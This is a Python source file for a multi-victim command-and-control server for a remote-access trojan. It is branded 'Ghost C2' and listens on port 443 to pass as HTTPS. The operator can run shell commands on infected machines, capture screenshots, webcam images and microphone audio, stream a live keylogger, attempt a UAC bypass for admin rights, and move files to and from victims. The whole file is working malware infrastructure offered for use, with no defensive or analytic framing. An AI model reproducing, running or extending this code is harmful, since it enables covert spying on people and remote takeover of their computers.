# ULTIMATE MULTI-CLIENT C2 SERVER.PY – MATCHES YOUR FINAL CLIENT (DEC 2025)
import socket, threading, os, time
from datetime import datetime

clients = {}
lock = threading.Lock()

def receive_file(conn, default_name="file"):
    name = input(f"    Save as [{default_name}]: ") or default_name
    with open(name, "wb") as f:
        while True:
            data = conn.recv(4096)
            if b"Sended" in data:
                f.write(data.replace(b"Sended", b""))
                break
            if b"FILE_SENT" in data:
                f.write(data.replace(b"FILE_SENT", b""))
                break
            if b"NOT_FOUND" in data:
                print("[-] File not found on victim")
                return
            f.write(data)
    print(f"[+] Saved → {name}")

def handle_client(conn, addr):
    global clients
    try:
        print(f"\n[+] GHOST CONNECTED → {addr[0]}:{addr[1]} @ {datetime.now().strftime('%H:%M:%S')}")
        with lock:
            name = f"Ghost-{len(clients)+1}"
            clients[conn] = {"addr": addr, "name": name, "admin": "Unknown"}

        while True:
            try:
                cmd = input(f"\n{name}@GHOST> ").strip()
                if not cmd: continue

                if cmd == "list":
                    print("\n=== ACTIVE GHOSTS ===")
                    for c, info in clients.items():
                        print(f"{info['name']} → {info['addr'][0]} → Admin: {info['admin']}")
                    print("=====================\n")
                    continue

                if cmd.startswith("select "):
                    try:
                        n = int(cmd.split()[1]) - 1
                        target = list(clients.keys())[n]
                        print(f"→ Switched to {clients[target]['name']}")
                        handle_client(target, clients[target]["addr"])  # jump in
                    except: print("Invalid number")
                    continue

                if cmd == "exit":
                    conn.close()
                    break

                conn.sendall(cmd.encode())

                # === SPECIAL COMMAND HANDLING ===
                if cmd in ["ss", "webcam", "mic"]:
                    receive_file(conn, f"{name}_{cmd}.png" if cmd != "mic" else f"{name}_audio.wav")

                elif cmd == "keylog":
                    print(f"[+] Keylogger started on {name} — Live keys below:")
                    while True:
                        try:
                            key = conn.recv(1024).decode(errors="ignore")
                            if not key or "stop" in key.lower(): break
                            print(f"{key.strip()}", end="", flush=True)
                        except: break
                    print("\n[+] Keylogger stopped")

                elif cmd == "elevate":
                    resp = conn.recv(1024).decode(errors="ignore")
                    if "ADMIN_GOT" in resp:
                        print("[+] ADMIN PRIVILEGES OBTAINED!")
                        clients[conn]["admin"] = "YES"
                    else:
                        print("[-] UAC bypass failed")

                elif cmd == "sysinfo":
                    info = conn.recv(4096).decode(errors="ignore")
                    print(info)
                    if "Admin    : Yes" in info:
                        clients[conn]["admin"] = "YES"

                elif cmd.startswith("download "):
                    receive_file(conn, os.path.basename(cmd[9:].strip()))

                elif cmd == "upload":
                    path = input("    File to send: ")
                    if os.path.exists(path):
                        conn.sendall(b"upload")
                        time.sleep(0.5)
                        with open(path, "rb") as f:
                            while chunk := f.read(4096):
                                conn.sendall(chunk)
                            conn.sendall(b"DONE")
                        print(f"[+] Uploaded {path}")
                    else:
                        print("File not found")

                else:
                    # Normal shell output
                    try:
                        response = b""
                        while True:
                            packet = conn.recv(4096)
                            if not packet: break
                            response += packet
                            if len(packet) < 4096: break
                        print(response.decode(errors="ignore"), end="")
                    except: pass

            except: break

    except: pass
    finally:
        with lock:
            if conn in clients:
                print(f"[-] Ghost lost → {clients[conn]['name']}")
                del clients[conn]
        try: conn.close()
        except: pass

def main():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 443))
    s.listen(50)
    print("""
╔══════════════════════════════════════════════════════════╗
║             ULTIMATE GHOST C2 – Glitch       ║
║                Listening on port 443 (HTTPS)             ║
╚══════════════════════════════════════════════════════════╝
""")
    print("Commands: ss | webcam | keylog | mic | cmd | ps | elevate | sysinfo | download <path> | upload | list | select <num>")

    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("\nShutting down C2...")
            break

if __name__ == "__main__":
    main()
